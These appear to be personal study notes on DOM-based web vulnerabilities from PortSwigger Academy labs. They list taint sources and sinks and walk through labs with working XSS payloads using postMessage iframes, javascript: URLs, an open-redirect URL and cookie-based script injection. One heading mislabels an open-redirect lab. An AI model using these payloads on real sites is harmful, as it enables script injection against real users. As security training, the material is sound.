# DOM Based vulnerabilities notes

[Portswigger](https://portswigger.net/web-security/dom-based)

## Methodology

So simple easy start to DOM inspection would be to both manually search for sinks, or to use DOM Invader.

To start DOM Invader load the extension in the burp browser:
![image](https://github.com/user-attachments/assets/68eda86b-2662-4683-a644-8c7a93167357)

You can open DOM Invader in a tab in the developer tools in the browser:
![image](https://github.com/user-attachments/assets/ff1f2f18-fd9d-4b07-b6c1-03c832d5e8e8)

Within here you can copy the canary to inject into parameters you have user input to, see current sinks and sources when your canary has been inputted, as well as other things. We will go over this more in details in the lab walkthroughs.

For the labs specifically we do seem to have a common addEventListener() that has a tain-flow vuln exposed on it. So make sure to also review the source page for possible things that might have sinks in them, see lists below.

### Sources

Common sources to abuse for taint-flow vulns

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

### Sinks to search for

|DOM-based vulnerability |	Example sink|
|:----|:----|
|DOM XSS 	|document.write()|
|Open redirection 	|window.location|
|Cookie manipulation |	document.cookie|
|JavaScript injection| 	eval()|
|Document-domain manipulation 	|document.domain|
|WebSocket-URL poisoning 	|WebSocket()|
|Link manipulation 	|element.src|
|Web message manipulation |	postMessage()|
|Ajax request-header manipulation |	setRequestHeader()|
|Local file-path manipulation| 	FileReader.readAsText()|
|Client-side SQL injection 	|ExecuteSql()|
|HTML5-storage manipulation |	sessionStorage.setItem()|
|Client-side XPath injection 	|document.evaluate()|
|Client-side JSON injection |	JSON.parse()|
|DOM-data manipulation 	|element.setAttribute()|
|Denial of service 	|RegExp() |

**For open-redirection vulns**

```
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

**For cookie**
```
document.cookie
```

**ADDITIONAL**
Further lists exists on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss)

## Labs Walkthrough

### DOM XSS using web messages

- as listed in the Hacktricks list from above, we found the usage of `.innerHTML` on the document.getElementById function:
- ![image](https://github.com/user-attachments/assets/6ba5d62e-99fb-4bb7-b15c-c2e36eebcf90)
- Now we will use the exploit server to craft an iframe that calls the print() function in javascript

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

- store and deliver to victim

### DOM XSS using web messages and a JavaScript URL

- review the site and notice another window.addEventListener function is defined here
- ![image](https://github.com/user-attachments/assets/c595163a-1341-42dd-8809-0013ea8be57a)
- looks like there might be a location.href dom we can abuse
- Now we go to the exploit server to craft an iframe that calls the print() function in javascript

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

- store and devlier to victim

### DOM XSS using web messages and JSON.parse

- review the site and notice another window.addEventListener function is defined here
- ![image](https://github.com/user-attachments/assets/72c0706f-10f9-432b-8e92-e7beaf5c35af)
- Let's break this down
1. a window.addEventListener is being created passing message, and function(e)
2. This is an iframe creation, with the ACMEplayer object pointed to the created iframe with a json blob with an element equaling `iframe`, the try catch is just validating that it is json, if not break out and return
3. a switch case that checks the value and see's what action needs to happen, in this case scrolling into view if `page-load` is the type.
4. checking if `load-channel` is the type sets the iframes src value to the url and loads this url in the iframe
5. checks for `player-height-changed` value and adjusts based on the value

- we will abuse the `load-channel` part of this event listener by crafting a url that is just our xss payload, in the exploit server

```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

- store and deliver to victim

### DOM-based cookie manipulation

- view a post and inspect the `Back to Blog` section
- ![image](https://github.com/user-attachments/assets/e83fd6c8-94da-4d5b-a983-4a37cc75475d)
- notice this functions values:
- ![image](https://github.com/user-attachments/assets/fb148073-72fa-4d83-8555-fb2362dcfe3f)
- we can abuse the `url` parameter to open redirect to any site we choose, including the exploit server

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```

### DOM-based cookie manipulation

- review a product and go back to the homepage, notice that a cookie is set with the url of the last product we were at
- ![image](https://github.com/user-attachments/assets/69f6f810-b1ba-468d-a5c6-c825c70cc906)
- We can also see in the source page that there is an href that must be what the cookie is reading from:
- ![image](https://github.com/user-attachments/assets/79a06497-2a2c-48da-ae31-f599d9eab1e7)
- craft a payload in exploit server to abuse this behavior of last product url being written to the cookie

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

- we can confirm that it does load into the cookie when viewing the exploit ourselves:
- ![image](https://github.com/user-attachments/assets/717b96bb-1abc-4eef-a3fb-680b86ee1dad)
- now store and deliver to victim
